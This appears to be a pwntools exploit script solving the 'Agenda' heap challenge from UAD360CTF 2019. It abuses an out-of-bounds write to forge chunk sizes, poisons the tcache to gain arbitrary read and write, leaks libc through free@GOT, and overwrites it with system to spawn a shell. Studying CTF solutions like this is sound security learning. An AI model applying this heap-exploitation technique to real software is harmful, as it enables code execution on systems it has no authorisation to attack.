from pwn import *

# --- Info ---
# CTF: UAD360CTF 2019
# Date: -
# Challenge: Agenda
# Description: OOB-write in heap that leads to leak and code execution via tcache poisoning
# --- End Info ---

#context.log_level = 'debug'
context.terminal = ["tmux", "sp", "-h"]
context.endian = 'little'

PATH = './agenda'
LIBC = './libc-2.27.so'
ENV = {"LD_PRELOAD":"./libc-2.27.so"}
libc  = ELF(LIBC, checksec = False)
binary  = ELF(PATH, checksec = False)

REMOTE = 0

HOST = '127.0.0.1'
PORT = 1337

def create_event(size, data):
    r.recvuntil('opcion>')
    r.sendline('1')
    r.recvuntil('del evento:\n')
    r.sendline(str(int(size)))
    r.recvuntil(' el evento:\n')
    r.send(data)

def show_event(idx):
    r.recvuntil('opcion>')
    r.sendline('2')
    r.recvuntil('el evento:\n')
    r.sendline(str(int(idx)))
    data = r.recvuntil('\nBienvenido')
    data = data.replace('\nBienvenido', '')
    return data

def edit_event(idx, data):
    r.recvuntil('opcion>')
    r.sendline('3')
    r.recvuntil('el evento:\n')
    r.sendline(str(int(idx)))
    r.recvuntil('el evento:\n')
    r.send(data)

def delete_event(idx):
    r.recvuntil('opcion>')
    r.sendline('4')
    r.recvuntil('el evento:\n')
    r.sendline(str(int(idx)))
    
def pad(addr):
    return addr + '\x00'*(8-len(addr))
    
context.binary = PATH
if REMOTE:
	r = remote(HOST, PORT)
else:
	r = process(PATH, env=ENV)


#gdb.attach(r)
#pause()

'''
sizes are stored at: (bss_addr + idx + 20) * 4
chunk addresses are stored at: (bss_addr + idx * 8)

As we are allowed up to 14 chunks, 80/8 = 10

So at the 11 chunk we will overwrite the first's chunk size, 
making it huge (as overwritten with a long value (an address))

Now chunk 0 can be used for overflow next chunk. As there is no
double free possible we can overflow next freed chunk to perform
a tcache poisoning attack, converting it in an arbitrary read and
arbitrary write primitive.

Then, as it has partial RELRO, we can make malloc() to return an arbitrary
pointer to free@got, and after reading it (libc leak) write onto it the address
of the hijack function (eg.: system and use a chunk to hold the command string.

'''

create_event(0x90, "AAAA")          # 0 (overflow-origin chunk)
create_event(0x90, "AAAA")          # 1 (overflowed-freed-chunk)
create_event(0x90, "/bin/sh\x00")   # 2 (command string chunk)

for n in range(8):
    create_event(0x90, "AAAA")


delete_event(1)

# tcache: -> ptr_1

offset = 0xa0

overflow = ''
overflow += 'A'*(offset-0x10)               # junk
overflow += p64(0xa0)                       # prev_size
overflow += p64(0xa1)                       # size (PREV_INUSE)
overflow += p64(binary.got['free'])         # overflow tcache 'next' with free@GOT

edit_event(0, overflow)

# tcache: -> ptr_1 -> free@GOT

create_event(0x90, "AAAA")                  # dummy chunk

# tcache: -> free@GOT

create_event(0x90, "\x42")                  # 12

# arbitrary read in free@GOT

leak = show_event(12)
leak_free = u64(pad(p64(libc.symbols['free'])[:1] + leak[1:7]))   # one byte is overwritten, so we add the LSB

libc.address = leak_free - libc.symbols['free']

log.info('Leaked: free @ ' + hex(leak_free))
log.info('Leaked: libc base @ ' + hex(libc.address))
log.info('Leaked: system @ ' + hex(libc.symbols['system']))


# arbitrary write in free@GOT with system()

edit_event(12, p64(libc.symbols['system']))


# call: system("/bin/sh\x00")

delete_event(2)

r.interactive()
r.close()
